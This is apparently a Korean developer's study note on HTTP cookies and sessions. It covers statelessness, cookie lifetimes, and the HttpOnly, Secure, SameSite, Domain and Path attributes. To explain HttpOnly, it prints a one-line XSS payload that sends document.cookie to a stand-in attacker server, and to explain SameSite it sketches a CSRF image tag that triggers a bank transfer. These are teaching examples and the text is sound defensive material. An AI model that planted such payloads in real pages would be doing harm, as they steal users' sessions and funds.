## 쿠키

- Set-Cookie : 서버에서 클라이언트로 쿠키 전달 (응답)

- Cookie : 클라이언트가 서버에서 받은 쿠키를 저장하고, http 요청시 서버로 전달한다.

## Stateless란 무엇인가?

- HTTP는 무상태 프로토콜이다.

- 클라이언트와 서버가 요청과 응답을 주고 받으면 연결이 끊어진다.

- 클라이언트가 다시 요청하면 서버는 이전 요청을 기억하지 못한다.

- 클라이언트와 서버는 서로 상태를 유지하지 않는다.

## 세선 + 쿠키 함께 사용 (= 사용자 로그인 세션 관리)

처음에 user=홍길동 으로 들어가서 서버한테서 쿠키를 받고, 

그 쿠키를 바로 웹브라우저에 저장하는 것은 엄청 위험하다. 

```java
"이유는. 홍길동의 정보들이 다 노출되기 때문이다"
```

<br/>

그리하여 처음에 서버쪽에서 로그인이 성공 되면, 세션 키라는 것을 서버에서 만들어서 

서버쪽 데이터 베이스에 저장을 해놓고, 다시 클라이언트에게 전달 할때는

`‘user=홍길동’`을 `‘세션id=값’` 으로 클라이언트에게 반환을 해주는 것이다.

<br/>

그러면 클라이언트는 그 사이트 요청을 보낼 때 마다 
 내 브라우저에서 ‘세션id=값’ 을 계속 보내는 것이다. 

```java
그러면 서버쪽에서 세션 id가 있으면 "아, 니가 홍길동이구나" 알 수 있게 되는 것이다
```

세션 키는 이 세션의 기간 동안 일시적으로 사용할 `'키'` 입니다. 

- 이, 키로 암호화와 복호화를 진행하게 됩니다.

<br/><br/>

## 쿠키는 브라우저(클라이언트), 세션은 서버에서 관리하는 정보

- 사용처

    - 사용자 로그인 세션 관리

    - 광고 정보 트래킹

- 쿠키 정보는 항상 서버에 전송된다.

    - 네트워크 트래픽 추가 유발

    - 최소한의 정보만 사용(세션 id, 인증 토큰)

    - 서버에 전송하지 않고, 웹 브라우저 내부에 데이터를 저장하고 싶다면 웹 스토리지

- 주의!

    - 보안에 민감한 데이터는 저장하면 안된다. (주민번호, 신용카드 번호 등등)

<br/><br/>

## 쿠키 - 생명주기

만료일이 되면 쿠키 삭제

- `세션 쿠키` : 만료 날짜를 생략하면 브라우저 종료시 까지만 유지

    - 단순히 웹 브라우저 종료시 클라이언트에서 종료 된다.

- `영속 쿠키` : 만료 날짜를 입력하면 해당 날짜까지 유지

    - 웹 브라우저가 종료되어도 클라이언트 시간이 남아 있는 한 살아남아 있다.

```java
"사실 세션은 쿠키로 구현이 되어 있다"
 
 -> **세션**은 어떤 프로세스들 사이에서 (브라우저와 웹서버) 서로를 인식한 이후, 
    통신을 마칠때 까지의 기간 정도로 이해하자.
```

## 궁금증!

```java
쿠키가 오가는 헤더를 실제로 보면
```

쿠키를 내려주는 서버를 띄워놓고 확인했다.

<br/>

### 1) 서버가 쿠키를 준다

```java
$ curl -i -c jar.txt http://localhost:18082/login

HTTP/1.1 200 OK
Set-cookie: JSESSIONID=A1B2C3D4E5; Path=/; HttpOnly
Set-cookie: memberId=1; Path=/
```

<br/>

`Set-Cookie` 헤더로 내려준다. 쿠키 하나에 헤더 한 줄이다.

<br/>

### 2) 다음 요청에 자동으로 실려간다

```java
$ curl -b jar.txt http://localhost:18082/me

받은 Cookie 헤더 = [JSESSIONID=A1B2C3D4E5; memberId=1]
```

<br/>

이번엔 `Cookie` 헤더 하나에 세미콜론으로 이어 붙어서 간다.

우리가 아무것도 안 했는데 브라우저가 알아서 붙인 것이다.

<br/>

```java
서버 -> 클라이언트 : Set-Cookie (여러 줄)
클라이언트 -> 서버 : Cookie (한 줄에 모아서)
```

<br/>

## 이게 Stateless 를 유지하는 방법이다

앞의 Stateful, Stateless 글에서 본 그 문제를 쿠키가 푼다.

<br/>

서버는 요청마다 아무것도 기억하지 않는다.

대신 클라이언트가 매번 `나 아까 그 사람이야` 라는 표를 들고 온다.

<br/>

`memberId=1` 을 그냥 담으면 위험하다는 것이 원문의 지적이다.

개발자 도구로 `1` 을 `2` 로 고치면 다른 사람이 되어버린다.

<br/>

## 세션은 그 표를 의미 없게 만드는 것이다

```java
쿠키에 담긴 것    : JSESSIONID=A1B2C3D4E5     <- 아무 의미 없는 랜덤 문자열
서버가 들고 있는 것 : A1B2C3D4E5 -> Member(id=1, name="민석")
```

<br/>

`A1B2C3D4E5` 를 고쳐봐야 서버 쪽 표에 없는 값이라 아무것도 안 된다.

<br/>

그래서 세션 ID는 반드시 추측할 수 없어야 한다.

`1, 2, 3` 처럼 순서대로 발급하면 남의 것을 바로 알아낼 수 있다.

<br/>

## HttpOnly 가 붙어 있는 이유

위 결과에서 `JSESSIONID` 에만 `HttpOnly` 가 붙어 있다.

<br/>

curl이 저장한 파일을 보면 표시가 따로 되어 있다.

```java
localhost           | / | memberId   | 1
#HttpOnly_localhost | / | JSESSIONID | A1B2C3D4E5
```

<br/>

`HttpOnly` 는 자바스크립트가 `document.cookie` 로 못 읽게 막는 것이다.

<br/>

이게 없으면 스크립트 한 줄로 세션을 훔칠 수 있다.

```javascript
new Image().src = "http://공격자서버/?c=" + document.cookie;
```

<br/>

게시글에 이런 스크립트를 심어두면, 그 글을 보는 사람의 세션이 전부 넘어간다.

이 공격을 `XSS` 라고 하고, `HttpOnly` 가 그 피해를 줄인다.

<br/>

## 옵션 세 가지는 같이 쓴다

```java
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax
```

<br/>

```java
HttpOnly - 자바스크립트가 못 읽는다        (XSS 방어)
Secure   - HTTPS 일 때만 전송한다          (도청 방어)
SameSite - 다른 사이트에서 온 요청엔 안 보낸다 (CSRF 방어)
```

<br/>

`SameSite` 를 설명하면 이렇다.

```java
공격자 사이트에 <img src="https://bank.com/transfer?to=공격자&amount=100만"> 을 심는다
-> 피해자가 그 페이지를 열면 bank.com 으로 요청이 간다
-> 브라우저가 bank.com 의 쿠키를 자동으로 붙인다
-> 은행 입장에서는 로그인한 사용자의 정상 요청으로 보인다
```

<br/>

`SameSite=Lax` 면 다른 사이트에서 시작된 요청에는 쿠키를 안 붙인다.

그러면 위 요청은 로그인 안 한 상태로 도착해서 거부된다.

<br/>

## 도메인과 경로도 정할 수 있다

```java
Set-Cookie: name=value; Domain=example.com; Path=/admin
```

<br/>

```java
Domain - 어느 도메인에 보낼지. 생략하면 정확히 그 도메인에만
Path   - 어느 경로에 보낼지. 생략하면 현재 경로 기준
```

<br/>

`Domain=example.com` 을 주면 `api.example.com` 에도 간다.

서브도메인이 여러 개일 때 로그인을 공유하는 방법이다.

<br/>

대신 서브도메인 하나가 뚫리면 쿠키가 전부 노출되니, 필요할 때만 쓴다.

<br/>

## 쿠키는 매 요청에 실려간다

이게 성능에도 영향을 준다.

```java
쿠키가 4 KB 쌓여 있다
-> 이미지 하나 받을 때도 4 KB 가 같이 올라간다
-> 페이지에 요청이 100 개면 400 KB 를 헛되이 보낸다
```

<br/>

그래서 정적 파일은 쿠키가 안 붙는 별도 도메인에서 서빙하는 방식을 쓴다.

`cdn.example.com` 처럼 아예 다른 도메인이면 쿠키가 안 따라간다.

<br/>

쿠키에 데이터를 많이 담으면 안 되는 이유가 이것이다.

`localStorage` 는 요청에 안 실리니, 서버가 몰라도 되는 것은 그쪽에 둔다.
